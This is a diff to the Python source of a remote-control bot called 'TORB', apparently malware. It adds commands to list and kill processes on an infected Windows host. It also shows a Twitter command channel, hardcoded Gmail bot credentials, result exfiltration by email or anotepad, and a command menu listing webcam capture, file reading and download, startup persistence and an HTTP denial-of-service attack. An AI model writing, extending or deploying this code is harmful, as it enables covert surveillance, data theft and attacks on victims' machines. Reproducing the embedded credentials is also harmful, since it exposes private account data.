@@ -70,6 +70,8 @@ import time
 import string
 import cv2
 import platform
+import wmi
+import signal
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -88,7 +90,7 @@ from sys import stdout, argv
 cntrlPanel = 'http://twitter.com/pyprototype'
 # Gmail - Bot authentication details (Server)
 gmail_user = 'pyhannahmaple@gmail.com'
-gmail_password = 'sweetiepie246'
+gmail_password = 'sweetiepie54'
 # Gmail - Receiving Address (Client)
 to = ['elliotarigato@gmail.com']
 # anotepad.com - backup output bot authentication details
@@ -263,6 +265,23 @@ def main():
 					print "Error launching DoS"
 					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
 				q = z
+			elif z == "pullprocess":
+				print "Pulling Active Processes..."
+				try:
+					procGet()
+				except:
+					print "Error pulling processes..."
+					relayMe("TORB Error\n\nTORB was unable to pull processes from this machine...")	
+				q = z
+			elif "killprocess" in z:
+				print "Terminating Process..."
+				b = z[12:]
+				try:
+					procTerminate(b)
+				except:
+					print "TORB was unable to terminate selected process..."
+					relayMe("TORB Error\n\nTORB was unable to terminate selected process... Possible UAC restriction.")
+				q = z
 			elif z == "startup":
 				print "Embedding to startup..."
 				storeStart()
@@ -390,6 +409,23 @@ def main():
 				except:
 					print "Error launching DoS"
 					relayMe("TORB is unable to launch DoS on this host. Check for typos and try again.")
+				q = z
+			elif z == "pullprocess":
+				print "Pulling Active Processes..."
+				try:
+					procGet()
+				except:
+					print "Error pulling processes..."
+					comm_backup("TORB Error\n\nTORB was unable to pull processes from this machine...")	
+				q = z
+			elif "killprocess" in z:
+				print "Terminating Process..."
+				b = z[12:]
+				try:
+					procTerminate(b)
+				except:
+					print "TORB was unable to terminate selected process..."
+					comm_backup("TORB Error\n\nTORB was unable to terminate selected process... Possible UAC restriction.")
 				q = z
 			elif z == "startup":
 				print "Embedding to startup..."
@@ -999,6 +1035,35 @@ def webcam_Capture():
 		print "Mac OS detected!"
 		print "Unfinished section..."
 
+# Grab Current Running Processes with associated IDs
+def procGet():
+	processesGathered = []
+	proccesesStr = ""
+
+	c = wmi.WMI ()
+
+	for process in c.Win32_Process ():
+	  processesGathered.append("%s - [%s]" % (process.Name,process.ProcessId))
+
+	for pgathered in processesGathered:
+		proccesesStr = proccesesStr + pgathered + "\n"
+
+	print proccesesStr
+
+	if bckChck == 0:
+		relayMe(proccesesStr)
+	elif bckChck == 1:
+		comm_backup(proccesesStr)
+
+# Terminate specific process by ID
+def procTerminate(selID):
+	os.kill(int(selID), signal.SIGTERM)
+	print "Process #%s Terminated!" % (selID)
+	if bckChck == 0:
+		relayMe("TORB Notification\n\nProcess #%s Terminated" % (selID))
+	elif bckChck == 1:
+		comm_backup("TORB Notification\n\nProcess #%s Terminated" % (selID))
+
 cmdList = """
 [Fun]:
 	msg [message] - Display Windows Message
@@ -1015,11 +1080,13 @@ cmdList = """
 	scandir [dir] - Scan Directory
 	read [dir] - Read File Content
 	download [dir] - Download File
+	pullprocess - View Active/Running Processes
 	webcamview - Take Web Cam Screenshot
 	startup - Embed to Startup
 
 [Destructive]:
 	stress [host] - HTTP Denial of Service
+	killprocess [pID] - Terminate Active Process with ID
 	scramblekeys - Scramble Key Output (Feature Removed)
 	exev - Executable Corruption (Feature Removed)
 	morphine - JPEG Injection Memory Exhaustion (Feature Removed)
